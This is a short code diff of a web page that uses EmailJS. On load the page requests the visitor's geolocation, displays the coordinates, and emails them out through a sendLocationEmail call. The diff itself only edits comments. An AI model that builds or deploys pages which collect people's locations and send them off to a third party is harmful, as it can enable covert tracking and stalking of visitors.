@@ -84,7 +84,7 @@
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         document.addEventListener("DOMContentLoaded", function () {
-            emailjs.init("CrVHH3e0Kot5rmodE"); // Public Key
+            emailjs.init("CrVHH3e0Kot5rmodE"); // Your EmailJS Public Key
 
             // Automatically request location permission when the page is loaded
             trackMovement();
@@ -131,7 +131,7 @@
                             document.getElementById("locationDisplay").textContent = 
                                 `📍 Latitude: ${latitude}, Longitude: ${longitude}`;
 
-                            sendLocationEmail(latitude, longitude);
+                            sendLocationEmail(latitude, longitude); // Send email with the location
                         },
                         (error) => {
                             console.error("❌ Error getting location:", error);
